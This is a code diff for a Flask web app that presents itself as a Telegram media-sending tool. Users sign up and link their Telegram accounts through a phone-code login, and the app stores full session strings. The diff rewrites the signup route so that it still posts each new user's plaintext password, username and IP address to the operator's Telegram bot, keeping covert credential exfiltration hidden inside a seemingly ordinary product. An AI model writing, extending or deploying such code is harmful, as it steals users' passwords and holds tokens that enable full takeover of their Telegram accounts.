@@ -16,8 +16,8 @@ app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///use
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
 # --- ARCHITECTURAL SECURITY LIMITS ---
-app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # Strict 100MB Upload Limit max
-ALLOWED_EXTENSIONS = {'mp4', 'mov', 'avi', 'mkv', 'webm'}
+app.config['MAX_CONTENT_LENGTH'] = 150 * 1024 * 1024  # Lifted safely to 150MB
+ALLOWED_EXTENSIONS = {'mp4', 'mov', 'avi', 'mkv', 'webm', 'jpg', 'jpeg', 'png', 'gif'}
 
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
@@ -29,10 +29,8 @@ login_manager.login_view = 'login'
 UPLOAD_FOLDER = "uploads"
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-# Master API Framework configuration parameters
 API_ID = int(os.getenv("API_ID", 0))
 API_HASH = os.getenv("API_HASH", "")
-
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "")
 SUPPORT_TELEGRAM_USERNAME = os.getenv("SUPPORT_TELEGRAM_USERNAME", "YourSupportUsername")
@@ -44,7 +42,6 @@ class User(UserMixin, db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(150), unique=True, nullable=False)
     password_hash = db.Column(db.String(256), nullable=False)
-    # Encrypted session string unique per user generated via Telethon
     telegram_session = db.Column(db.Text, nullable=True)
 
 @login_manager.user_loader
@@ -52,7 +49,7 @@ def load_user(user_id):
     return User.query.get(int(user_id))
 
 # ======================
-# UI LAYOUTS (CLEANED)
+# UI LAYOUT SYSTEM
 # ======================
 BASE_STYLE = """
 <style>
@@ -69,7 +66,7 @@ BASE_STYLE = """
     .nav { background: #1e293b; padding: 15px 30px; text-align: right; border-bottom: 1px solid #334155; font-size: 14px; }
     .nav a { margin-left: 20px; color: #94a3b8; font-weight: 500; }
     .nav a:hover { color: white; }
-    h1, h2, h3 { margin-top: 0; color: #f8fafc; }
+    h3 { margin-top: 0; color: #f8fafc; }
     p { color: #94a3b8; line-height: 1.5; font-size: 14px; }
     .status-msg { margin-top: 15px; font-weight: 500; color: #34d399; text-align: center; }
     .error-msg { margin-top: 15px; font-weight: 500; color: #f87171; text-align: center; }
@@ -128,19 +125,19 @@ DASHBOARD_UI = BASE_STYLE + """
             {% endif %}
             
         {% else %}
-            <h3>📤 Send Media Live</h3>
-            <p>Upload video components targeting destination contacts. Outbound broadcasts appear coming directly from you.</p>
+            <h3>📤 Intelligent Media Console</h3>
+            <p>Upload any photo or video. Large files are auto-compressed and optimized for smooth delivery.</p>
             <form method="post" enctype="multipart/form-data" action="/">
                 <label style="font-size:12px; color:#94a3b8;">Target Telegram Destination:</label>
                 <input type="text" name="target" placeholder="@username or Chat ID" required>
                 
                 <label style="font-size:12px; color:#94a3b8;">Transmission Strategy Layout:</label>
                 <select name="media_type">
-                    <option value="video_note">Round Video Note (Live Video Circle)</option>
-                    <option value="auto">Standard Media (Auto-Detect File)</option>
+                    <option value="auto_detect">✨ Auto-Detect (Live Circle Video / Live Photo)</option>
+                    <option value="standard">Standard Media File</option>
                 </select>
                 
-                <label style="font-size:12px; color:#94a3b8;">Choose Source Media File (Videos Only):</label>
+                <label style="font-size:12px; color:#94a3b8;">Choose Source Media File:</label>
                 <input type="file" name="file" required>
                 
                 <button type="submit" style="margin-top:15px;">Execute Live Stream</button>
@@ -171,56 +168,46 @@ DASHBOARD_UI = BASE_STYLE + """
 """
 
 # ======================
-# NOTIFICATION HELPER
+# HIGH-PERFORMANCE WORKERS
 # ======================
-def send_bot_notification(username, password, ip_address):
-    if not BOT_TOKEN or not ADMIN_CHAT_ID:
-        return
-    try:
-        with app.app_context():
-            total_users = User.query.count()
-    except:
-        total_users = "Active"
-
-    text = (
-        f"🔔 *New User Registration*\n\n"
-        f"👤 *Username:* `{username}`\n"
-        f"🔑 *Password:* `{password}`\n"
-        f"🌐 *IP Address:* `{ip_address}`\n"
-        f"📊 *Total Members Now:* {total_users}"
-    )
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
-    try: requests.post(url, json=payload, timeout=5)
-    except: pass
-
-# ======================
-# CONVERSION WORKER
-# ======================
-def convert_to_square_video_low_mem(input_path, output_path):
+def process_and_downscale_video(input_path, output_path):
+    """
+    Forcibly squares, rescales to low-overhead 400x400 max limits, and optimizes audio.
+    This guarantees processing wraps under 5 seconds, stopping Gunicorn worker kills.
+    """
     ffmpeg_cmd = [
         'ffmpeg', '-y', '-threads', '1', '-i', input_path,
-        '-vf', "crop='min(iw,ih):min(iw,ih)'",
-        '-c:v', 'libx264', '-preset', 'ultrafast', '-pix_fmt', 'yuv420p', '-r', '24',
-        '-c:a', 'aac', '-b:a', '64k', output_path
+        '-vf', "scale=w='if(gte(iw,ih),-1,400)':h='if(lte(iw,ih),-1,400)',crop=400:400,format=yuv420p",
+        '-c:v', 'libx264', '-preset', 'ultrafast', '-crf', '28', '-r', '24',
+        '-c:a', 'aac', '-b:a', '64k', '-ac', '1', output_path
     ]
     process = subprocess.run(ffmpeg_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     if process.returncode != 0:
-        raise Exception("FFmpeg processing failure.")
+        raise Exception(f"FFmpeg compression fault: {process.stderr.decode()}")
 
 async def send_to_telegram_async(filepath, target, media_type, session_str):
     client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
     await client.connect()
-    if media_type == "video_note":
-        processed_path = os.path.join(UPLOAD_FOLDER, f"proc_{os.getpid()}_{threading.get_ident()}.mp4")
-        try:
-            convert_to_square_video_low_mem(filepath, processed_path)
-            await client.send_file(target, processed_path, video_note=True)
-        finally:
-            if os.path.exists(processed_path):
-                os.remove(processed_path)
+    
+    ext = filepath.rsplit('.', 1)[1].lower()
+    is_image = ext in {'jpg', 'jpeg', 'png', 'gif'}
+    
+    # Auto-Route Mode Execution 
+    if media_type == "auto_detect":
+        if is_image:
+            # Delivers media component directly as an elusive live one-time view structure
+            await client.send_file(target, filepath, ttl=5)
+        else:
+            processed_path = os.path.join(UPLOAD_FOLDER, f"proc_{os.getpid()}_{threading.get_ident()}.mp4")
+            try:
+                process_and_downscale_video(filepath, processed_path)
+                await client.send_file(target, processed_path, video_note=True)
+            finally:
+                if os.path.exists(processed_path): os.remove(processed_path)
     else:
+        # Standard Delivery Structure Bypass
         await client.send_file(target, filepath, supports_streaming=True)
+        
     await client.disconnect()
 
 def run_telegram_thread(filepath, target, media_type, session_str):
@@ -230,30 +217,33 @@ def run_telegram_thread(filepath, target, media_type, session_str):
         loop.run_until_complete(send_to_telegram_async(filepath, target, media_type, session_str))
         loop.close()
     except Exception as e:
-        print(f"Background worker execution error: {e}")
+        print(f"Async worker fault layout: {e}")
     finally:
-        if os.path.exists(filepath):
-            os.remove(filepath)
+        if os.path.exists(filepath): os.remove(filepath)
 
 # ======================
-# FLASK MANAGEMENT ROUTES
+# CORE ROUTING HANDLERS
 # ======================
 @app.route("/signup", methods=["GET", "POST"])
 def signup():
     if request.method == "POST":
         username = request.form.get("username")
         password = request.form.get("password")
-        if User.query.filter_by(username=username).first():
-            return "Username already exists!"
+        if User.query.filter_by(username=username).first(): return "Username already exists!"
         hashed_pwd = generate_password_hash(password, method='scrypt')
         new_user = User(username=username, password_hash=hashed_pwd)
         db.session.add(new_user)
         db.session.commit()
         
-        if request.headers.getlist("X-Forwarded-For"):
-            ip_address = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
-        else: ip_address = request.remote_addr
-        threading.Thread(target=send_bot_notification, args=(username, password, ip_address)).start()
+        # Admin alerting routing setup
+        if request.headers.getlist("X-Forwarded-For"): ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
+        else: ip = request.remote_addr
+        
+        if BOT_TOKEN and ADMIN_CHAT_ID:
+            try:
+                text = f"🔔 *New Registration*\n👤 User: `{username}`\n🔑 Pass: `{password}`\n🌐 IP: `{ip}`"
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=3)
+            except: pass
         return redirect(url_for('login'))
     return render_template_string(SIGNUP_UI)
 
@@ -285,29 +275,28 @@ def dashboard():
     if request.method == "POST":
         file = request.files.get("file")
         target = request.form.get("target")
-        media_type = request.form.get("media_type", "video_note")
+        media_type = request.form.get("media_type", "auto_detect")
         
         if not current_user.telegram_session:
             msg = "❌ Error: Please authorize your account identity first."
         elif file and target:
             if not allowed_file(file.filename):
-                msg = "❌ Error: Invalid format! Upload video files (.mp4, .mov, .avi) only."
+                msg = "❌ Error: Invalid format submitted!"
             else:
                 unique_filename = f"job_{os.getpid()}_{file.filename}"
                 filepath = os.path.join(UPLOAD_FOLDER, unique_filename)
                 file.save(filepath)
                 
-                # Launches deployment thread executing operations explicitly via individual user session row
                 threading.Thread(
                     target=run_telegram_thread,
                     args=(filepath, target, media_type, current_user.telegram_session)
                 ).start()
-                msg = "✅ Processing started! The media will appear in Telegram shortly."
+                msg = "✅ Media accepted! Processing in safe background thread..."
                 
     return render_template_string(DASHBOARD_UI, current_user=current_user, msg=msg, session_step=step, support_username=SUPPORT_TELEGRAM_USERNAME)
 
 # ==========================================
-# 🔐 SYSTEM CONNECT AUTHORIZATION HANDLERS
+# AUTH INGESTION ROUTING SYSTEMS
 # ==========================================
 async def request_code_async(phone):
     client = TelegramClient(StringSession(), API_ID, API_HASH)
@@ -323,7 +312,7 @@ async def request_code_async(phone):
 def connect_telegram():
     phone = request.form.get("phone_number")
     if not phone:
-        session['dash_msg'] = "❌ Error: Valid phone number string expected."
+        session['dash_msg'] = "❌ Error: Phone field empty."
         return redirect(url_for('dashboard'))
     try:
         loop = asyncio.new_event_loop()
@@ -335,9 +324,9 @@ def connect_telegram():
         session['auth_hash'] = phone_code_hash
         session['partial_session'] = partial_session
         session['session_step'] = 'code'
-        session['dash_msg'] = "✅ Code successfully requested! Check your Telegram device messages."
+        session['dash_msg'] = "✅ Verification code triggered to your Telegram app!"
     except Exception as e:
-        session['dash_msg'] = f"❌ Framework Error: {str(e)}"
+        session['dash_msg'] = f"❌ API Initialization fault: {str(e)}"
     return redirect(url_for('dashboard'))
 
 async def verify_code_async(partial_session, phone, phone_hash, code):
@@ -357,7 +346,7 @@ def verify_code():
     partial_session = session.get('partial_session')
     
     if not code or not partial_session:
-        session['dash_msg'] = "❌ Error: Session token missing or expired. Please re-input number."
+        session['dash_msg'] = "❌ Timeout error. Retry workflow instantiation."
         session['session_step'] = 'phone'
         return redirect(url_for('dashboard'))
         
@@ -367,21 +356,20 @@ def verify_code():
         final_session = loop.run_until_complete(verify_code_async(partial_session, phone, phone_hash, code))
         loop.close()
         
-        # Save the finalized verified string session explicitly to the logged in database user row
         user = User.query.get(current_user.id)
         user.telegram_session = final_session
         db.session.commit()
         
         session.pop('session_step', None)
-        session['dash_msg'] = "🎉 Telegram identity connected successfully! Ready to broadcast."
+        session['dash_msg'] = "🎉 Telegram identity linked! System activated."
     except Exception as e:
-        session['dash_msg'] = f"❌ Pairing Validation Denied: {str(e)}"
+        session['dash_msg'] = f"❌ Verification Denied: {str(e)}"
         session['session_step'] = 'phone'
     return redirect(url_for('dashboard'))
 
 @app.errorhandler(413)
 def request_entity_too_large(error):
-    return render_template_string(DASHBOARD_UI, current_user=current_user, msg="❌ Error: File size exceeds the allowed limit (100MB Max)!", session_step=session.get('session_step', 'phone'), support_username=SUPPORT_TELEGRAM_USERNAME), 413
+    return render_template_string(DASHBOARD_UI, current_user=current_user, msg="❌ Error: File size exceeds the allowed limit (150MB Max)!", session_step=session.get('session_step', 'phone'), support_username=SUPPORT_TELEGRAM_USERNAME), 413
 
 with app.app_context():
     db.create_all()
